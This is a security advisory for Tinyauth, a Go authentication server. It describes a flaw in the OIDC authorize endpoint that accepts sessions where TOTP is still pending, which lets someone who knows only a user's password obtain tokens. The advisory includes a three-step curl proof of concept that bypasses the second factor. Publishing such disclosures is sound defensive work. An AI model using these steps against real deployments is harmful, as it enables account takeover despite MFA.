# Tinyauth vulnerable to TOTP/2FA bypass via OIDC authorize endpoint

**GHSA**: GHSA-3q28-qjrv-qr39 | **CVE**: CVE-2026-32246 | **Severity**: high (CVSS 8.5)

**CWE**: CWE-287

**Affected Packages**:
- **github.com/steveiliop56/tinyauth** (go): < 1.0.1-20260311144920-9eb2d33064b7

## Description

### Summary

The OIDC authorization endpoint allows users with a TOTP-pending session (password verified, TOTP not yet completed) to obtain authorization codes. An attacker who knows a user's password but not their TOTP secret can obtain valid OIDC tokens, completely bypassing the second factor.

### Details

When a user with TOTP enabled logs in at `POST /api/user/login`, the server creates a session with `TotpPending: true` and returns a session cookie. The context middleware (`internal/middleware/context_middleware.go:56-66`) correctly sets `TotpPending: true` and does not set `IsLoggedIn` for these sessions.

However, the OIDC authorize handler (`internal/controller/oidc_controller.go:105-116`) only checks whether a user context exists via `utils.GetContext(c)`. It does not check `IsLoggedIn` or `TotpPending`. Since the context middleware populates a context for TOTP-pending sessions (with the username filled in), `GetContext` succeeds, and the handler proceeds to issue an authorization code at line 156 using the username from the incomplete session.

For comparison, the proxy controller (`internal/controller/proxy_controller.go:176-179`) correctly blocks TOTP-incomplete sessions by checking `IsBasicAuth && TotpEnabled` and setting `IsLoggedIn = false`. The OIDC authorize handler has no equivalent guard.

`StoreCode` at `internal/service/oidc_service.go:305` saves the code with the victim's `sub` claim. The attacker then exchanges this code at `POST /api/oidc/token` for a valid access token and ID token.

### PoC

Prerequisites: a tinyauth instance with at least one OIDC client configured and a local user with TOTP enabled.

Step 1 — Log in with password only (do not complete TOTP):

```
curl -c cookies.txt -X POST http://localhost:3000/api/user/login \
  -H "Content-Type: application/json" \
  -d '{"username":"totpuser","password":"totp123"}'
```

Response: `{"message":"TOTP required","status":200,"totpPending":true}`

Step 2 — Request an OIDC authorization code using the TOTP-pending cookie:

```
curl -b cookies.txt -X POST http://localhost:3000/api/oidc/authorize \
  -H "Content-Type: application/json" \
  -d '{"client_id":"my-client-id","redirect_uri":"http://localhost:8080/callback","response_type":"code","scope":"openid","state":"test"}'
```

Response: `{"redirect_uri":"http://localhost:8080/callback?code=<AUTH_CODE>&state=test","status":200}`

Step 3 — Exchange the code for tokens:

```
curl -X POST http://localhost:3000/api/oidc/token \
  -u "my-client-id:my-client-secret" \
  -d "grant_type=authorization_code&code=<AUTH_CODE>&redirect_uri=http://localhost:8080/callback"
```

Response contains `access_token`, `id_token`, and `refresh_token` for the victim user. TOTP was never submitted.

### Impact

Complete bypass of TOTP/MFA for any user account on any tinyauth instance that has OIDC clients configured. An attacker who has compromised a user's password (credential stuffing, phishing, database breach) can obtain SSO tokens for that user's identity without knowing the TOTP secret. This defeats the purpose of the second factor entirely. All downstream applications relying on tinyauth's OIDC provider for authentication are affected.
